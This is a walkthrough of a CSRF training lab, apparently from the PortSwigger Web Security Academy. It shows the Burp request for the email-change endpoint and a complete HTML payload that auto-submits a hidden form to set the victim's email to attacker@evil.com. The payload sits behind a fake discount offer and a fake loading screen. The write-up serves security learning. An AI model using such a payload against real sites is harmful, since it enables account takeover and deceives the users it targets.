## CSRF vulnerability with no defenses

This lab's email change functionality is vulnerable to CSRF.
### Objective
	1. Craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.
	2. Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

### Credentials

## Step by step walkthrough of Lab

	1.We get a website with a page like this:
	
![[CSRF-01.png]]

	2.As we know the vulnerability lies in the update email function lets go directly to My account.

![[CSRF-02.png]]

	3.We have a login screen here lets use the default creds given to us.

![[CSRF-03.png]]
	4.Here whatever email we provide it will get changed if the session cookie is verified,lets check the burp request after requesting for an email change.


```Burp
POST /my-account/change-email HTTP/1.1
Host: 0a76007e047e4d3980ee0dd000150096.web-security-academy.net

```

	5.Here we can see that the website is sending email as a POST request in body for changing the Email of that particular authenticated user.
	
![[CSRF-04.png]]
	6.Now Lets go to the exploit server.
![[CSRF-05.png]]
	7. Here everything is already set what we need to do is set the body parameter in such a way that when the user clicks on the crafted email it gets opened in their browser and the email changes to the attackers email.
```HTML
<html>
  <body>
    <h1>Limited Time Offer!</h1>
    <p>Click below to claim your exclusive discount!</p>
    
    <form id="csrfForm" action="https://0a3f009403a2207d8037031b00d60047.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com"/>
    </form>
    
    <script>
      // Auto-submit the form immediately
      document.getElementById('csrfForm').submit();
      
      // Optional: Show a fake loading screen to make it seem more legitimate
      setTimeout(function() {
        document.body.innerHTML = '<h1>Processing your request...</h1><p>Please wait while we apply your discount.</p>';
      }, 100);
    </script>
  </body>
</html>
```
	8.The above code snippet is what i have engineered to do the following:
		1.Excite the user by social engineering(Here i have used discount coupon)
		2.A Form submission using POST request to the site.
		3.Make the Form submission hidden using type='hidden'
		4.provide name=email for the POST element(Check burp req).
		5.value=attacker@evil.com(The email we want to use to change for victim).
		6.Auto submit form using javascript.
		7.Showing a "Processing your request" fake discount processing.
